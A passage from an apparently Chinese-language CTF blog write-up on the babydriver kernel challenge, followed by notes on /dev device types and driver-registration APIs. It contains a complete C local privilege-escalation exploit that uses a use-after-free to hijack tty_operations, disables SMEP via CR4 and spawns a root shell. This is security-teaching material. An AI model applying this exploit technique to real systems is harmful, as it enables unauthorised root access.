&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	close(device2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>同样是利用uaf</p>
<p>不过这次利用的是在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code>。</p>
<p>tty_struct的size是0x2e0</p>
<p>利用uaf我们可以劫持其中的tty_operations函数指针</p>
<p>那么在我们对这个设备进行相应操作（如 write、ioctl）时便会执行我们布置好的恶意函数指针。</p>
<p>由于没有开启 SMAP 保护，故我们可以在用户态进程的栈上布置 ROP 链与 <code>fake tty_operations</code> 结构体。</p>
<p>使用 gdb 进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 <code>tty_operaionts</code> 结构体到用户态的栈上，并选择任意一条内核 gadget 作为 fake tty 函数指针以方便下断点：</p>
<p>这段调试可能有点难理解,即劫持tty_ops的函数表为内核上的任意可区分代码,这样我们在调试时可以在对应的位置下断点,以观察当前的上下文环境</p>
<p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其 rax 寄存器中存放的便是 tty_operations 结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的 gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头。</p>
<p>使用 ROPgadget 查找相关 gadget，发现有两条符合我们要求的 gadget：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget.png" alt="image.png"></p>
<p>gdb 调试，发现第一条 gadget 其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget2.png" alt="image.png"></p>
<p>那么利用这条 gadget 我们便可以很好地完成栈迁移的过程，执行我们所构造的 ROP 链。</p>
<p>而<code>tty_operations</code>结构体开头到其 write 指针间的空间较小,直接在此处rop显然是行不通的(与write指针冲突)，因此我们还需要进行二次栈迁移，这里随便选一条改 rax 的 gadget 即可：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget3.png" alt="image.png"></p>
<p><strong>exp:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = POP_RDI_RET;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRootPrivilige;</span><br><span class="line">    rop[p++] = SWAPGS_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = IRETQ_RET;</span><br><span class="line">    rop[p++] = getRootShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);<span class="comment">//这一步为什么要read??因为下一步写的时候要从开头写,如果直接填充到ops的话,那么中间很多重要信息就被覆盖了,所以先将原本的信息读出来,等会填充的时候就用这个填充,保证开头到目标之间的内容不被改变</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺带一提,本题覆盖cr4寄存器取消了smep保护,那么在获得了commint_creds和prepare_kernel_cred的地址后可以直接用户空间代码调用提权,最后着陆用户态spawn一个shell</p>
<h2 id="延拓"><a href="#延拓" class="headerlink" title="延拓"></a>延拓</h2><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>在Linux系统中，<code>/dev</code> 目录是一个特殊的目录，它包含了设备文件（device files）。设备文件是用于访问系统硬件设备或与内核通信的一种方式。<code>/dev</code> 目录中的设备文件允许用户和应用程序通过文件I/O的方式与硬件设备进行交互，这种文件I/O操作被视为与设备的输入输出（I/O）交互。</p>
<p>这些设备文件包括以下几类</p>
<p><strong>字符设备</strong></p>
<p><em>字符设备</em>是指每次与系统传输1个字符的设备。这些设备节点通常为传真,虚拟终端和串口调制解调器之类设备提供流通信服务，它通常不支持随机存取数据。</p>
<p>字符设备在实现时，大多不使用缓存器。系统直接从设备读取／写入每一个字符。</p>
<p><strong>块设备</strong></p>
<p><em>块设备</em>是指与系统间用块的方式移动数据的设备。这些设备节点通常代表可寻址设备，如硬盘、CD-ROM和内存区域。</p>
<p>块设备通常支持随机存取和寻址，并使用缓存器。操作系统为输入输出分配了缓存以存储一块数据。当程序向设备发送了读取或者写入数据的请求时，系统把数据中的每一个字符存储在适当的缓存中。当缓存被填满时，会采取适当的操作（把数据传走），而后系统清空缓存。</p>
<p><strong>伪设备</strong></p>
<p>在类Unix操作系统中，设备节点并不一定要对应物理设备。没有这种对应关系的设备是<em>伪设备</em>。操作系统运用了它们提供的多种功能。部分经常使用到的伪设备包括：</p>
<ul>
<li><p><code>/dev/null</code></p>
<p>接受并丢弃所有输入；即不产生任何输出。</p>
</li>
<li><p><code>/dev/full</code></p>
<p>永远在被填满状态的设备。</p>
</li>
<li><p><code>/dev/loop</code></p>
<p>Loop设备</p>
</li>
<li><p><code>/dev/zero</code></p>
<p>产生连续的NUL字符的流(数值为0)。</p>
</li>
<li><p><code>/dev/random</code></p>
<p>产生一个虚假随机的任意长度字符流。(Blocking)</p>
</li>
<li><p><code>/dev/urandom</code></p>
<p>产生一个虚假随机的任意长度字符流。(Non-Blocking)</p>
</li>
</ul>
<h3 id="dev-init"><a href="#dev-init" class="headerlink" title="dev_init"></a>dev_init</h3><p>简易分析下babydriver中出现的dev模块注册</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="alloc-chrdev-region"><a href="#alloc-chrdev-region" class="headerlink" title="alloc_chrdev_region"></a>alloc_chrdev_region</h4><p>首先出现的是alloc_chrdev_region函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">char_device_struct</span> *<span class="title">cd</span>;</span></span><br><span class="line">	cd = __register_chrdev_region(<span class="number">0</span>, baseminor, count, name);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(cd))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(cd);</span><br><span class="line">	*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>alloc_chrdev_region</code> 是Linux内核中用于动态分配字符设备号的函数。在Linux系统中，字符设备是一种用于与字符设备驱动程序通信的设备类型，例如终端设备、串口设备等。每个字符设备都有一个唯一的设备号，该设备号由主设备号和次设备号组成。</p>
<p>参数说明：</p>
<ul>
<li><code>dev</code>：用于存储分配的设备号范围的变量（包括主设备号和起始的次设备号）。</li>
<li><code>baseminor</code>：起始的次设备号。</li>
<li><code>count</code>：要分配的设备号数量。</li>
<li><code>name</code>：设备名称，用于在<code>/proc/devices</code>中标识设备。</li>
</ul>
<p>对应的逆操作函数是<strong>unregister_chrdev_region</strong></p>
<h4 id="cdev-init"><a href="#cdev-init" class="headerlink" title="cdev_init"></a>cdev_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(cdev, <span class="number">0</span>, <span class="keyword">sizeof</span> *cdev);</span><br><span class="line">	INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">	kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">	cdev-&gt;ops = fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>cdev_init</code> 函数的作用是初始化字符设备结构体 <code>cdev</code>。在Linux内核编程中，<code>cdev</code> 结构体代表字符设备，并通过该结构体来向内核注册字符设备。</p>
<p>参数说明：</p>
<ul>
<li><code>cdev</code>：要初始化的字符设备结构体。</li>
<li><code>fops</code>：与该字符设备关联的文件操作结构体，其中包含了指向驱动程序定义的处理函数的指针</li>
</ul>
<h4 id="cdev-add"><a href="#cdev-add" class="headerlink" title="cdev_add"></a>cdev_add</h4><p><code>cdev_add</code> 函数是Linux内核中用于向内核注册字符设备的函数。在使用字符设备时，首先需要创建并初始化 <code>struct cdev</code> 结构体，然后通过 <code>cdev_add</code> 将其注册到内核中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *p, <span class="type">dev_t</span> dev, <span class="type">unsigned</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	p-&gt;dev = dev;</span><br><span class="line">	p-&gt;count = count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON(dev == WHITEOUT_DEV)) &#123;</span><br><span class="line">		error = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = kobj_map(cdev_map, dev, count, <span class="literal">NULL</span>,</span><br><span class="line">			 exact_match, exact_lock, p);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">	kobject_get(p-&gt;kobj.parent);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">	kfree_const(p-&gt;kobj.name);</span><br><span class="line">	p-&gt;kobj.name = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>p</code>：指向 <code>struct cdev</code> 结构体的指针，表示要注册的字符设备。</li>
<li><code>dev</code>：字符设备的设备号，包括主设备号和次设备号。</li>
<li><code>count</code>：设备的数量。通常为1，表示一个设备。</li>
</ul>
<p>对应的逆操作函数是<strong>cdev_del</strong></p>
<h4 id="class-create"><a href="#class-create" class="headerlink" title="_class_create"></a>_class_create</h4><p><code>_class_create</code> 函数是Linux内核中的一个函数，用于创建一个设备类（<code>struct class</code>）,并返回指向 <code>struct class</code> 结构体的指针。设备类是用于组织和管理设备的结构，它提供了一种将相关设备分组的机制，使得用户空间应用程序更容易识别和管理这些设备。</p>
<p>对应的逆操作函数是<strong>class_destroy</strong></p>
<h4 id="device-create"><a href="#device-create" class="headerlink" title="device_create"></a>device_create</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> device *<span class="title function_">device_create</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> class *class, <span class="keyword">struct</span> device *parent,</span></span><br><span class="line"><span class="params">			     <span class="type">dev_t</span> devt, <span class="type">void</span> *drvdata, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">	va_list vargs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">	va_start(vargs, fmt);</span><br><span class="line">	dev = device_create_groups_vargs(class, parent, devt, drvdata, <span class="literal">NULL</span>,</span><br><span class="line">					  fmt, vargs);</span><br><span class="line">	va_end(vargs);</span><br><span class="line">	<span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(device_create)</span><br></pre></td></tr></table></figure>
<p><code>device_create</code> 函数是 Linux 内核中用于创建字符设备节点（<u>设备文件</u>）的函数。这个函数通常与 <code>class_create</code> 配合使用，用于将字符设备注册到设备类并在 <code>/dev</code> 目录下创建相应的设备节点。</p>
<p>参数说明：</p>
<ul>
<li><code>class</code>：指向 <code>struct class</code> 结构体的指针，表示设备类。</li>
<li><code>parent</code>：父设备的指针，可以是 <code>NULL</code>。</li>
<li><code>devt</code>：设备号，包括主设备号和次设备号。</li>
<li><code>drvdata</code>：指向要关联到设备的私有数据的指针，通常为 <code>NULL</code>。</li>
<li><code>fmt</code>：用于创建设备节点的格式字符串。</li>
<li><code>...</code>：用于填充 <code>fmt</code> 字符串中的占位符。</li>
</ul>
<p><code>device_create</code> 的主要作用是创建一个字符设备节点，并将其注册到设备类中。通过这个函数，用户空间应用程序可以访问 <code>/dev</code> 目录下的设备节点，以与驱动程序通信。</p>
<p>对应的逆操作函数是<strong>device_destroy</strong></p>
<hr>
<p>看一下两个关键的结构体</p>
<p><strong>file_operations</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 